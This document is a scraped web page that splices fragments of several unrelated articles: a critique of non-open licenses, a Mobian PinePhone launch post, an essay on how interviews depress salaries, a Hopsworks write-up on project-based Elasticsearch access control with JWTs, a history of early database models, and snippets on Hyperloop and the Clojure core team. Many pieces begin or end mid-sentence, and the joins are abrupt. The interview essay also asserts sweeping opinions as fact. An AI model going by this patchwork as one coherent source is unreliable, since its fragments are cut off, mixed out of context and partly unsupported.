<p>#6 is the one most violated by these licenses. Restricting to non-commercial usage is fundamentally against the spirit of free and open source software. From the very beginning, Stallman himself was very emphatic that people be allowed to make money from free software. He and FOSS leaders after him realised that preventing people from making money from free and open source software will doom the movement. It is vitally important to FOSS that people be encouraged to use it in commercial and for-profit ventures. This will help foster the spread of FOSS. These licenses disregard both that and the benefit of this clause of the OSD to the whole of FOSS in preference to their own singular commercial needs.</p>

<p>In fact, the vibrant cloud-based and cloud-native environment within which most software companies operate now and which makes so much innovation possible (including that of these misled companies), exists because companies have released their technologies under OSI-approved licenses and have come together to collaborate on common and powerful tools. This is the culture that successful companies embrace. Even Microsoft, the former nemesis of free and open source, recognizes that this type of collaboration is critical to the continued growth and evolution of the company.</p>

<p>To be perfectly clear: There is nothing wrong with making money from software, FOSS or otherwise. Choosing to use a proprietary license for software is a valid business decision and one I support. Choosing to use an <a href="https://opensource.org/licenses">OSI-approved license</a> is an equally valid business decision and, again, one I support. However the license to choose for the software created by your company is just that: a <em>BUSINESS</em> decision.</p>

<p>There are many potential variables to consider and those variables will be different for each company, but “how will we make enough money from this to maintain and grow the company sustainably?” is one that is consistent across all of these decisions. If a company’s answer to that is, “we’ll just give away the software to bring in leads” but they don’t have a compelling enough commercial offering on top of that to convert those leads to sales, while their competitor converts those leads and more using the same technology, that is NOT the fault of open source software, licensing, or culture. That’s a company that doesn’t understand how to do business, and blaming Amazon isn’t going to change that.</p>

      <p><img src="https://blog.mobian-project.org/images/mobian-ce-header.jpg" alt="Mobian Community Edition"></p>
<p>We are absolutely thrilled to announce that <a href="https://www.pine64.org/">Pine64</a>
is releasing a Mobian Community Edition of the
<a href="https://www.pine64.org/pinephone/">PinePhone</a>! This is a major milestone for
our project, which started less than a year ago as a way to bring Debian to this
exact mobile device!</p>

<p>The PinePhone is basically a handheld computer with 4G connectivity. With
<a href="https://www.mobian-project.org/">Mobian</a>, this (truly smart) phone comes with
a distribution tons of <a href="https://www.debian.org/">Debian</a> users are already
familiar with, optimized for the PinePhone while still giving them access to the
50,000+ packages already in the Debian archive.</p>
<p>Mobian ships with <a href="https://puri.sm/posts/phosh-overview/">Phosh</a>, a
mobile-oriented desktop environment based on <a href="https://www.gnome.org/">GNOME</a>
technology, initially developed by <a href="https://puri.sm/">Purism</a> for their
<a href="https://puri.sm/products/librem-5/">Librem 5</a> smartphone. Default applications
have been selected for their usability on a phone-size display wherever
possible, and we’re confident this list can only grow over time.</p>
<p>Combined with the absence of software trackers, this gives you an ad-free,
privacy-respecting platform you can bring anywhere with you and use the same way
you do with your personal computer. Taking it to the next level, plug in a USB-C
dock connected to a keyboard, mouse and HDMI monitor, and you won’t be able to
tell if you’re using a phone or a “regular” computer.</p>

<p>When first powering on your PinePhone Mobian Community Edition, you’ll be
greeted with an installer, allowing you to choose your user password and
presenting you with the ability to enable full disk encryption.</p>
<p>Hardware support is pretty much complete, and while it still needs to be refined
in a number of areas, you’ll be able to enjoy full phone functionality
(including voice calls, SMS, mobile broadband, WiFi, front and back cameras…)
from day one.</p>
<p>However, please note the software is still mostly work-in-progress, and evolves
on an almost-daily basis. Your device will arrive with a several months old
image, so we can only recommend that you update your PinePhone as soon as
possible to take advantage of the latest developments.</p>

<p>The PinePhone Mobian Community Edition will be available to pre-order from the
<a href="https://pine64.com/product-category/pinephone/">Pine64 Store</a> on January 18th
and comes in two configurations:</p>
<ul>
<li>$149 – 2GB RAM + 16GB eMMC</li>
<li>$199 – 3GB RAM + 32GB eMMC Convergence Package with an included USB-C dock</li>
</ul>
<p>Finally, you should be aware of the fact that Pine64 will generously donate $10
to the Mobian project for each device sold, a significant portion of which will
be given back to the Debian project on which we rely heavily (and to which we
obviously contribute!). We can’t thank them enough for their commitment to bring
FLOSS-driven devices to the market and support to open-source projects!</p>

<p><em>Updated September 2020.</em></p>



<p><em>Originally written in mid-2017 in collaboration with <a href="https://www.zepner.com/">Zvi Epner</a>. </em></p>

<h2>Even if you get the job, the interview process is set up for you to lose.</h2>



<p>Companies want you to think an interview is a series of hurdles you need to jump over. The conventional applicant thinking goes: “If I can show I’m able to meet the company’s standards, they’ll be impressed enough to offer me the job along with a fair salary.”</p>



<p>Many people blindly accept this way of thinking, but the truth is it’s extremely toxic to their happiness and financial well-being.</p>



<p>Companies rely on the interview process to make you feel weak and malleable. They take advantage of it to keep your salary low. It could result in consistently worse opportunities over your entire career, costing you tens or hundreds of thousands of dollars over your lifetime.</p>



<p>I’d like to propose an alternative. What if you thought about the interview process as a <em>two-way search for alignment</em>? </p>



<p>It could go something like this: You and some companies are going to interview each other to see if you have business goals that line up. If that happens, and you can agree on a price that works, you can make a fair deal.</p>



<div><figure><img loading="lazy" src="https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support2EDIT-1024x783.png" alt="" width="512" height="392" srcset="https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support2EDIT-1024x783.png 1024w, https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support2EDIT-300x229.png 300w, https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support2EDIT-768x587.png 768w, https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support2EDIT-1084x828.png 1084w, https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support2EDIT-361x276.png 361w, https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support2EDIT.png 1200w" sizes="(max-width: 512px) 100vw, 512px"></figure></div>



<p>The key is this: You’re not being <em>given</em> a job. This isn’t a tryout. It’s an <strong>equal exchange</strong>. Your employer gets a valuable addition to their team, and you get a salary (plus the fulfillment of putting your talents to good, productive use).</p>



<p>So instead of buying into the recycled conventional wisdom of job interviews, let’s reconstruct the process and focus on the fact that almost every job boils down to a simple business formula:</p>



<h3><strong>It’s </strong><strong>you</strong><strong> getting tasks or projects done for </strong><strong>money</strong><strong>.</strong></h3>



<p>You might be thinking “But what about fulfillment? Or the company’s mission?”</p>



<p>If you feel good about what you’re doing for work, or you believe in your company’s mission, that’s great. It’s a nice feature, and we should all be so lucky.&nbsp;</p>



<p>But here’s a list of things you can’t do with job satisfaction:</p>



<ul><li>Pay your rent or mortgage</li><li>Feed yourself or your family</li><li>Pay down your student loans</li><li>Make your car payment</li><li>Save for retirement</li></ul>



<p>So regardless of the legitimate value you may place on your job’s social impact, from the company’s perspective it really is the simple financial arrangement described before.&nbsp;</p>



<p>You do the work. For money. The company then takes your work and sells it to their customers in some form at a 2-5x markup.</p>



<p>Now consider this: The company wants to make money, but it can’t raise prices too much or it’ll lose customers. So most companies focus on reducing expenses too. </p>



<p>The biggest expense for most organizations is payroll. Which means if the company wants to be as profitable possible (hint: they do), <strong>it has to try and pay you as little as possible.</strong></p>



<p>It cannot be stressed how important money is to a company. Companies have an entirely different attitude about money compared to most people.</p>



<p>If you spent all the cash in your bank accounts and maxed out your credit cards, you’d have a pretty bad time. Maybe you’d even go bankrupt. But you wouldn’t die.&nbsp;</p>



<p>If a <em>company</em> runs out of money, it’s usually toast. Without cash flow, it can’t pay its employees, buy materials or supplies, or provide services for its clients. Money is like oxygen to a company. If it doesn’t get enough, the lights go out and it’s dead forever.</p>



<div><figure><img loading="lazy" src="https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support1EDIT-1024x949.png" alt="" width="512" height="475" srcset="https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support1EDIT-1024x949.png 1024w, https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support1EDIT-300x278.png 300w, https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support1EDIT-768x712.png 768w, https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support1EDIT-1084x1005.png 1084w, https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support1EDIT-361x335.png 361w, https://tomdehnel.com/wp-content/uploads/2020/08/tomdehnel_support1EDIT.png 1200w" sizes="(max-width: 512px) 100vw, 512px"></figure></div>



<p>This simple fact means companies have learned to be ruthless about cost reduction. Even at the rare companies that pay their people well, the goal is almost always to pay their workers as little as possible.</p>



<p>This doesn’t just apply to people who pick fruit for a living – the company you work for operates the same way. And the main way they do it is…</p>



<h3><strong>They break you down during the hiring process so they can lock you in for the lowest possible price.</strong></h3>



<p>They set you up to go through all kinds of mental trips and traps so by the end – when they put that offer in front of you – you feel relieved, happy, and grateful. In this state, most people readily accept an offer that’s lower than what they’re truly worth.</p>



<p>Most people have an inkling that trying to negotiate during the offer stage is a good idea. Perhaps they give a half-assed attempt at another couple thousand dollars, but they’ll capitulate if the company pushes back because they feel like they better not press their luck. Who wants to lose out on this opportunity to pay their bills? And they can’t bear the thought of going through that exhausting, degrading interview process again.</p>



<p>It’s in the company’s best interest for you to feel this way, and the entire interview process is structured to create that outcome.</p>



<p>The company wants to keep you on the hook, while doing its best to make you forget that you’re a unique, specialized, and valuable person.</p>



<p>As many people as possible should internalize this concept so they can avoid falling victim to it. It starts with recognizing it when it comes up. <strong>Here are some examples of the ways companies set you up to fail as a job seeker:</strong></p>



<ol><li><strong>They call you a “job seeker” (even though they’re the ones seeking help.)</strong><ul><li>Companies don’t arbitrarily hand out jobs for your benefit. They hire because <em>they need someone to help them</em>. They’re the ones who have a need, but by classifying you as a job seeker, applicant, or candidate, they start to subtly shift the balance of power back in their favor.</li></ul></li><li><strong>They present a pie-in-the-sky written job description.</strong><ul><li>Even if you’re the perfect candidate for the job, the written job description is meant to make you doubt yourself. But here’s the thing most people don’t realize: Most times the job description is a hurried copy-paste of whatever they used last time for a similar position. It was probably requested at the last minute by a busy hiring manager – and it was most likely written and posted by an intern or administrative person with very little knowledge of the actual business need. The truth is most companies are in a constant mild state of chaos and it’s entirely possible that no one can clearly articulate what they need for any single position. It should be up to you to tell them. After all, you’re the professional and they’re the ones who need someone like you.</li></ul></li><li><strong>They encourage you to research them before the interview (but not the other way around).</strong><ul><li>This would be like going on a first date with someone who expected you to tell you what you about them online. Doing this puts you in a subservient position at best, and at worst it makes you seem creepy and weird.</li></ul></li><li><strong>They require you to write a cover letter to no one.</strong><ul><li>They ask for a cover letter or give you one of those generic text boxes to fill out. But they don’t tell you who to address it to. Forcing a cover letter means you’ll have to begin with the weakest of all opens: “Dear Hiring Manager.” You might as well address it “Dear Anyone Who Will Listen.” Another way to make you feel subservient.</li></ul></li><li><strong>They offer you things instead of money.</strong><ul><li>They tell you how they have this great summer Friday policy. Or they show off the coffee machine. Or say you can bring your dog to work. Or they’ll have someone come and pick up your dry cleaning, like a king! These things are nice, but given the choice, most people would rather have the money.</li></ul></li></ol>

<ol start="6"><li><strong>They make you talk salary with an HR stooge.</strong><ul><li>When it comes time to negotiate the price, they make you speak with someone new. Just like when the car dealership has you talk to the “finance manager.” This person doesn’t understand your value and you haven’t had the chance to build any rapport with them. Typically all they’re allowed to do is quote company policy.</li></ul></li><li><strong>They dazzle you with pseudo-professional language.</strong><ul><li>By taking the humanity out of the conversation and jamming a bunch of corporate-speak, acronyms, and industry terminology down your throat, companies can put you on your back foot right out of the gate. This serves them because it can get you thinking “maybe I don’t know enough to do this job.”</li></ul></li><li><strong>They use corporate lackeys to pitch you.</strong><ul><li>They’ll bring in other team members during the interview process to give you a heavily biased and often blatantly false idea of what it’s like to work there. These people are effectively paid actors who oversell the benefits of working for the company.</li></ul></li><li><strong>They make you go through an outside recruiter.</strong><ul><li>Although many will tell you they love their work, recruiters serve themselves – just like everybody else. They’ll gladly place you anywhere they can, and you are ultimately just one more dry-erase tally mark on the whiteboard in their office.</li></ul></li><li><strong>They load up Glassdoor with fake reviews.</strong><ul><li>Like most online reviews, these are usually fake. The positive reviews have either been written by management themselves, or by employees who have been compelled by management. Deep down you already know this. The negative reviews are genuine but they’ve all been written by people who are sore about being fired or snubbed.</li></ul></li><li><strong>They ask you to tell them your previous or required salary.</strong><ul><li>Under no circumstance should you ever disclose this to an employer. But they’ll ask you in a way that makes you feel bad for not answering their question. It’s better for you to let them know you’d rather discuss that after you’ve determined how much value you’re going to add to their bottom line.</li></ul></li><li><strong>They try and get you thinking about a promotion before you’ve even got the job.</strong><ul><li>Companies love to talk about future “opportunities” as if they’re the ones who call all the shots. They do it so you take the current job for less money. They set up ladders for you to climb, but never fully commit to their end of the bargain. Notice how most employee growth plans contain language that ultimately leaves it at the company’s discretion. As if depending on someone else to say when you’re good enough is a sensible way to live a life you’re proud of.</li></ul></li><li><strong>They use misleading double-speak to encourage obedience.</strong><ul><li>“This isn’t the kind of place where anyone is <em>forced</em> to work on weekends” …</li></ul></li></ol></div></div></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR<strong>: </strong>The need for an open-source alternative to Elasticsearch has recently become more evident; platforms that bundle Open Distro for Elasticsearch are able to future-proof open-source support for free-text search and Elasticsearch. In this post, we describe how Hopsworks leverages the authentication and authorization support in Open Distro for Elasticsearch to make free text search a project-based multi-tenant service in Hopsworks. More concretely, Hopsworks now supports dynamic <a href="https://en.wikipedia.org/wiki/Role-based_access_control#:~:text=Role%2Dbased%20access%20control%20(RBAC)%20is%20a%20policy%2D,simple%20to%20perform%20user%20assignments.">role-based access control</a> (RBAC) to indexes in elasticsearch with no performance penalty by building on Open Distro for Elasticsearch (ODES).<br></p><p>In January 2021, <a href="https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks">Elastic switched from the Apache V2 open-source license</a> for both Elasticsearch and Kibana to a non open-source license to Server Side Public License (SSPL).</p><p>Hopsworks is an open-source platform that includes Open Distro for Elasticsearch (a fork of Elasticsearch) and Kibana.</p><p>In Hopsworks, we use Elasticsearch to provide free-text search for AI assets (features, models, experiments, datasets, etc). We also make Elasticsearch indexes available for use by programs run in Hopsworks. As we interpret it, the latter functionality means we contravene the licensing terms of the SSPL:</p><blockquote>“If you make the functionality of the Program or a modified version available to third parties as a service... (license conditions apply)”</blockquote><p>‍</p><p>Luckily, we recently made the switch from Elasticsearch to <a href="https://opendistro.github.io/for-elasticsearch/">Open Distro for Elasticsearch</a>, supported by AWS, which is Apache v2 licensed.<br></p><p>Open Distro for Elasticsearch supports Active Directory and LDAP for authentication and authorization. <a href="https://opendistro.github.io/for-elasticsearch-docs/old/0.9.0/docs/security/permissions/">Using the Security plugin</a>, you can use RBAC to control the actions a user can perform. A role defines the cluster operations and index operations a user can perform, including access to indices, and even fine-grained field and document level access. RBAC allows an administrator to define a single security policy and apply it to all members of a department. But individuals may be members of multiple departments, so a user might be given multiple roles. <a href="https://link.springer.com/chapter/10.1007/978-3-540-85776-1_17">With dynamic role-based access control</a> you can change the set of roles a user can hold at a given time. </p><p>For example, if a user is a member of two departments - one for accessing banking data and another one for accessing trading data, with dynamic RBAC, you could restrict the user to only allow her to hold one of those roles at a given time. The policy for deciding which role the user holds could, for example, depend on what VPN (virtual private network) the user is logged in to or what building the user is present in. In effect, dynamic roles would allow the user to hold only one of the roles at a time and sandbox her inside one of the domains - banking or trading. It would prevent her from cross-linking or copying data between the different trading and banking domains.</p><p>Hopsworks implements a dynamic role-based access control model through its project-based multi-tenant security model<strong>. </strong>&nbsp;Every Project has an <strong>owner</strong> with full read-write privileges and zero or more <strong>members</strong>.&nbsp; A project owner may invite other users to his/her project as either a <strong>Data Scientist </strong>(read-only privileges and run jobs privileges) or <strong>Data Owner</strong> (full privileges). Users can be members of (or own) multiple Projects, but inside each project, each member (user) has a unique identity - we call it a <em>project-user identity</em>.&nbsp; For example, user <em>Alice</em> in <em>Project A</em> is different from user <em>Alice </em>in <em>Project B - </em>(in fact, the system-wide (project-user) identities are <strong><em>ProjectA__Alice</em></strong> and <strong><em>ProjectB__Alice</em></strong>, respectively)<em>. </em></p><p><em>‍</em>As such, each project-user identity is effectively a role with the project-level privileges to access data and run programs inside that project. If a user is a member of multiple projects, she has, in effect, multiple possible roles, but only one role can be active at a time when performing an action inside Hopsworks. When a user performs an action (for example, runs a program) it will be executed with the project-user identity. That is, the action will only have the privileges associated with that project. The figure below illustrates how Alice has a different identity for each of the two projects (A and B) that she is a member of. Each project contains its own separate private assets. Alice can use only one identity at a time which guarantees that she can’t access assets from both projects at the same time.</p><p>Hopsworks enables you to host sensitive data in a shared cluster using a <a href="https://www.logicalclocks.com/blog/how-we-secure-your-data-with-hopsworks">project-based access control security model</a> (an implementation of dynamic role-based access control). In Hopsworks, a project is a secure sandbox with members, data, code, and services. Similar to GitHub repositories, projects are self-service: users manage membership, roles, and can securely share data assets with other projects. This <em>project-based multi-tenant security model</em> enables users to host both sensitive and shared data in a single Hopsworks cluster - you do not need to manage and pay for separate clusters.&nbsp;<br></p><figure id="w-node-14452fea4591-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bafe67f9a01f3d5100b3_Screenshot%202021-01-15%20at%2016.54.57.png" loading="lazy" alt=""></p></figure><p>‍</p><p>An important aspect of project-based multi-tenancy is that assets can be shared between projects - sharing does not mean that data is duplicated. The current assets that can be shared between projects are: files/directories in HopsFS, Hive databases, feature stores, and Kafka topics. For example, in the figure below there are three users (User1, User2, and User3)&nbsp; and two projects (A and B). User1 is a member of project A, while User2 and User3 are members of project B. All three users (User1, User2, User3) can access the assets shared between project A and project B. As sharing does not mean copying, the access control rules for the asset are updated to give users in the other project read or write permissions on the shared asset.</p><p>‍<br></p><figure id="w-node-213ef0acf495-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bb182dbe7b79013d5093_Screenshot%202021-01-15%20at%2016.55.17.png" loading="lazy" alt=""></p></figure><p>‍</p><p>P<em>roject-user identity</em> is primarily based on a X.509 certificate issued internally by Hopsworks. Access control policies, however, are implemented by the platform services (HopsFS, Hive, Feature Store, Kafka), and for Elasticsearch Open Distro, permissions are managed using an open-source <a href="https://github.com/logicalclocks/elasticsearch-chef">Hopsworks project-based authorizer plugin</a>.</p><p>The following PySpark code snippet, <a href="https://github.com/logicalclocks/hops-examples/blob/master/notebooks/spark/Elasticsearch-python.ipynb">available as a notebook</a> when you run the Spark Tour on Hopsworks, shows how to read from an index that is private to a project from PySpark. There is also an <a href="https://github.com/logicalclocks/hops-examples/blob/master/notebooks/spark/Elasticsearch-scala.ipynb">equivalent Scala/Spark notebook</a>.</p><p>

Every user and every service in a Hopsworks cluster has a private key and an X.509 certificate. Hopsworks projects also support multi-tenant services that are not currently backed by X.509 certificates, including Elasticsearch. <a href="https://opendistro.github.io/for-elasticsearch/">Open Distro for Elasticsearch</a> supports authentication and access control using JSON Web Tokens (<a href="https://dzone.com/articles/what-is-jwt-token">JWT</a>).&nbsp; Similar to application X.509 certificates, Hopsworks’ resource manager (HopsYARN) issues a JWT for each submitted job and propagates it to running containers. Using the JWT, user code can then securely make calls to Elasticsearch indexes owned by the project. The JWT is rotated automatically before it expires and invalidated by HopsYARN once the application has finished.<br></p><p>For every Hopsworks project, a number of private indexes can be created in Elasticsearch: an index for real-time logs of applications in that project (accessible via Kibana), an index for ML experiments in the project, and an index for provenance for the project’s applications and file operations. Elastic indexes are private to the project - they are not accessible by users that are not members of the project. This access control is implemented as follows: when a request is made on Elasticsearch using a JWT token, our authorizer plugin extracts the project-specific username from the JWT token, which is of the form:<strong><em>‍</em></strong></p><p>‍<strong><em>ProjectA__Alice</em></strong>&nbsp;</p><p>The index names have the following form:</p><p><strong><em>ProjectA__ElasticIndex</em></strong>&nbsp;</p><p>Our plugin checks if a project-specific user is allowed to read/write an index by checking that the prefix (<strong>ProjectA</strong>) of both the user and the index match one another. We plan to add support for sharing elasticsearch indexes between projects by storing a list of projects allowed to perform read and write operations, respectively, on the indexes belonging to a project.</p><h2>X.509 Service certificates</h2><p>In Hopsworks, services communicate with each other using their own certificate to authenticate and encrypt all traffic. Each service in Hopsworks, that supports TLS encryption and/or authentication, has its own service-specific X.509 certificate, including all services in the ELK Stack (Elasticsearch, Kibana, and Logstash). Service certificates contain the Fully Qualified Domain Name (FQDN) of the host they are installed on and the login name of the system user that the process runs as. They are generated when a user provisions Hopsworks, and they have a long lifespan. Service certificates can be rotated automatically in configurable intervals or upon request of the administrator.&nbsp;</p><h2>Securely accessing Elastic Indexes in Jobs on Kubernetes&nbsp;<br></h2><figure id="w-node-d2ae8e066750-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bc186b327c00f6b51384_Screenshot%202021-01-15%20at%2016.59.47.png" loading="lazy" alt=""></p></figure><p>Hopsworks can be integrated with Kubernetes by configuring it to use one of the available authentication mechanisms: API tokens, credentials, certificates, and IAM roles for AWS’ managed EKS offering.

Bachman (no relation to Erlich Bachman) was working as part of a small team at General Electric. One year later, Bachman’s team introduced what would later be recognized as the first database management system - the Integrated Data Store (IDS).</p><p>10 years later, Bachman would receive the coveted <a href="https://amturing.acm.org/">Turing Award</a>, often called the Nobel Prize of computer science, for his contributions to computing with IDS. </p><h3 id="what-was-ids">What was IDS?</h3><p>In the early 1960s, computer science was just beginning as an academic field. For context, ASCII was not introduced until 1963.</p><p>To understand IDS we have to first understand the two main forces that led to its development: </p><ol><li>The introduction of disk storage</li><li>A migration to high-level programming languages</li></ol><!--kg-card-begin: markdown--><h5 id="diskstorage">Disk storage</h5>

This was a vast improvement from its predecessor, tape drives, which required moving sequentially through the tape to retrieve a specific piece of data. </p><p>But developers now had to figure out where records were stored on the disk. Due to the limitations of <a href="https://medium.com/@princeabhishek410/understanding-file-management-system-in-operating-system-4c7fbfc306f2">file management systems</a> in early operating systems, this was an advanced task reserved only for experienced programmers. </p><p>Developers needed a solution to simplify working with disk drives.</p><!--kg-card-begin: markdown--><h5 id="highlevelprogramming">High-level programming</h5>
<!--kg-card-end: markdown--><p>At the same time, computer science was beginning to move from innovators to early adopters on the <a href="https://en.wikipedia.org/wiki/Diffusion_of_innovations">adoption curve</a>. Low level programming languages like Assembly were popular among the early academics, but regular programmers were switching to higher level programming languages like COBOL for their usability.</p><p><a href="https://cacm.acm.org/magazines/2016/7/204036-how-charles-bachman-invented-the-dbms-a-foundation-of-our-digital-world/fulltext?mobile=false#body-3">So what was IDS?</a> IDS solved for disk storage and high-level programming. IDS allowed developers to use high-level programming languages, like COBOL, to build applications that input and retrieve data from disk storage. Because of this function, IDS has received the distinction as the first database management system.</p><h3 id="codasyl-a-new-standard-for-database-management">CODASYL - A new standard for database management</h3><p>In 1969, the Committee of Data Systems Languages (CODASYL) released a report proposing a standard for database management. Bachman was part of the committee, and the report drew heavily from IDS. </p><p>The CODASYL Data Model introduced many of the core features in database management systems that we use today:</p><ul><li>Schemas</li><li>Data definition language (DDL)</li><li>Data manipulation language (DML)</li></ul><p>Most importantly, IDS and CODASYL introduced a new way for modeling data that influenced the eventual development of SQL - the <strong>network data model</strong>.</p><h2 id="the-network-data-model-better-than-todays-relational-model">The Network Data Model - Better Than Todays Relational Model?</h2><figure><img src="https://lh5.googleusercontent.com/NxY7lsez_qxOIV5dLEXwJf-lbwhDo27cQ5JsEHUM0Tw-20M_nRfW_8rKPa571f9uwavlTFvRb0HoZGv13LFHEbRy7i_3atsXMzh1DlWUa0_1V6SZHdDeaN53nHMLhydHTc0yolyN" alt="Example of a Network Data Model"><figcaption>Above: Network model example</figcaption></figure><p>A data model is a standardized way to describe (model) the world (data). </p><p>The previous hierarchical data model used tree structures to describe data, but these were limited to one-to-many relationships. The new network model allow records to have multiple parents, which created a <strong>graph structure</strong>. By allowing multiple parents, network models were able to model many-to-one and many-to-many relationships. </p><p>In the network model, relationships between tables were stored in <em>sets</em>. Each set had an <em>owner</em> (i.e. teachers) and one or more <em>members</em> (i.e. classes and students).</p><p>One of the key benefits of the network model is that related records in a set were connected directly by pointers. Sets were implemented using next, prior, and owner pointers, which allowed for easy traversal similar to a linked list. </p><p>The low-level nature of network data models offered performance benefits, but they came at a cost. The network data model had increased storage costs because every record had to store extra pointers to its previous and parent record.</p><h2 id="arrival-of-the-relational-model">Arrival of The Relational Model</h2><figure><img src="https://blog.arctype.com/content/images/2021/01/image-4.png" alt="Example of the relational data model - Tuples, Relations, and Attributes" srcset="https://blog.arctype.com/content/images/size/w600/2021/01/image-4.png 600w, https://blog.arctype.com/content/images/2021/01/image-4.png 751w" sizes="(min-width: 720px) 720px"><figcaption>Above: <a href="http://www.myrgpvdbms.com/2018/05/define-terms-domain-tuple-attribute-and.html">Example of a relational model</a></figcaption></figure><p>In 1970, 8 years afters IDS, Edgar F. Codd introduced the relational model in his seminal paper <a href="https://www.seas.upenn.edu/~zives/03f/cis550/codd.pdf">“A Relational Model of Data for Large Shared Data Banks”</a> (also earning him a spot with Bachman as a Turing Award recipient).</p><p>Codd showed that all data in a database could be represented in terms of <em>tuples </em>(<em>rows</em> in SQL) grouped together into <em>relations </em>(<em>tables</em> in SQL). To describe the database queries, he invented a form of first-order predicate logic called <a href="https://www.geeksforgeeks.org/tuple-relational-calculus-trc-in-dbms/">tuple relational calculus</a>.</p><p>Tuple relational calculus introduced a <strong>declarative language</strong> for querying data. Declarative programming languages allow programmers to say <em>what </em>they want to do without describing <em>how </em>to do it.</p><p>This new declarative language was much easier to use for developers. The relational model laid out all the data in the open. Developers could retrieve all the data from a table, or read a single row, in one command. (thanks <a href="https://en.wikipedia.org/wiki/Query_optimization">query optimizer</a>)</p><p>Gone were the days of following a labyrinth of pointers to find your data. &nbsp;</p><h2 id="relational-vs-network-data-models">Relational vs Network Data Models</h2><p>Relational databases decreased the high storage costs that network databases had by <strong>normalizing data</strong>. Normalization was a process of decomposing tables to eliminate redundancy, and thereby decrease the footprint of data on disk.</p><p>However, relational databases had an increased CPU cost. In order to process normalized data, relational databases had to load tables in memory and use compute power to “join” tables back together. Let’s walk through the process for finding all classes and students for a given teacher with a relational model.</p><p>The database system would first perform an operation to retrieve all relevant classes. Then it would perform a second operation to retrieve student data. All of this data would be stored in memory, and it would run a third operation to merge the data before returning the result.</p><figure><img src="https://lh4.googleusercontent.com/8BGzrtrrXJig9p_y8RvzWdS36JEeCde97G5kyEKvwj70aeTiQTu7HkhiYmXJAYpJNykrWNVkI3NpQVaxpTZ2aNFZZSQwv7Nj2-QukpxKMm1pr8EivCMs0bb1dRrke3EBYITqAYIN" alt="Performance comparison between relational and network models"><figcaption>Performance comparison between relational and network models</figcaption></figure><p>In a performance case study using real data, <a href="https://raima.com/network-model-vs-relational-model/">Raima</a> found that network database models had 23x better insert performance and 123x faster query performance.</p><p>So why are relational databases the leading database solution?</p><p><strong>Usability</strong>.</p><p>The relational model was more flexible to changes, and its declarative syntax simplified the job for programmers. </p><p>And Moore’s law was working its magic in the background. The cost of computing continued to decrease, and eventually the increased computing cost of relational models was outweighed by the productivity gains. </p><p>Fast forward 50 years, and now the most expensive resource in a data center is the CPU. <a href="http://www.arctype.com/downloads">Sign up for Arctype</a> and get notified of a future post where I discuss what databases might look like over the next 50 years.</p><!--kg-card-begin: html--><p>

Possibly one of the greatest leaps in transportation for generations, the concept promises to slash journey times between cities from several hours to a matter of minutes. Musk first mentioned that he was thinking about a concept for a "fifth mode of transport", calling it the Hyperloop, in July 2012 at a PandoDaily event in Santa Monica, California. He envisions the more advanced versions will be able to go at hypersonic speed.</span></p><blockquote id="viewer-4l8mu"><span>It's cross between a Concorde, a railgun, and an air hockey table - <strong>Elon Musk - CEO of Tesla and SpaceX </strong></span></blockquote><p id="viewer-bedt"><span>Since 2015, the yearly Hyperloop Pod Competition sponsored by SpaceX allowed student and non-student teams to participate, design and for some, build a subscale prototype transport vehicle in order to demonstrate the technical feasibility of various aspects of the Hyperloop concept.</span></p><h2 id="viewer-dkdqo"><span>An Important Milestone </span></h2><p id="viewer-8io9u"><span>The test took place on November 8, 2020, at the Virgin Hyperloop's DevLoop test track in the desert outside Las Vegas, Nevada.

<blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">We are excited to welcome <a href="https://twitter.com/fogus?ref_src=twsrc%5Etfw">@fogus</a>, long-time Clojure contributor and co-author of Joy of Clojure, to the Clojure core team!</p>— Rich Hickey (@richhickey) <a href="https://twitter.com/richhickey/status/1350110634776657920?ref_src=twsrc%5Etfw">January 15, 2021</a></blockquote>

<p>This is a change from my previous relationship with the Clojure Core team that in the past few years has been sporadic at best. This circumstance arose through necessity rather than desire and so I’m overjoyed to work closely with the team once again. Over the past few years <a href="https://twitter.com/puredanger">Alex Miller</a> has exerted a Herculean effort in shepherding the language through numerous versions and steady growth. I’m overjoyed to be given the opportunity to join him in helping push the language forward, and I’ll do my very best to avoid breaking everything.</p>

<p>So what this means is that I’ll be far more visible<sup id="fnref:v"><a href="#fn:v" rel="footnote">1</a></sup> in and around the Clojure ecosystem while spending my time thinking about Clojure more so than just using Clojure.<sup id="fnref:cljs"><a href="#fn:cljs" rel="footnote">2</a></sup></p>

<blockquote>
<p>Ours is a brand new world of allatonceness. “Time” has ceased. “Space” has vanished. We now live in a global village…a simultaneous happening. We are back in accoustic space. We have begun again to structure the primordial feeling, the tribal emotions from which a few centuries of literacy divorced us. We have had to shift our stress of attention from action to reaction. […] Electronic circuitry profoundly involves men with one another. Information pours upon us, instantaneously and continuously. Our electrically configured world has forced us to move from the habit of data classification to the mode of pattern recognition. We can no longer build serially, block-by-block, step-by-step, because instant communication insures that all the factors of the environment and of experience coexist in the state of active interplay.</p>

<h2 id="start-with-a-goal-of-synthesis">Start With A Goal of Synthesis</h2>
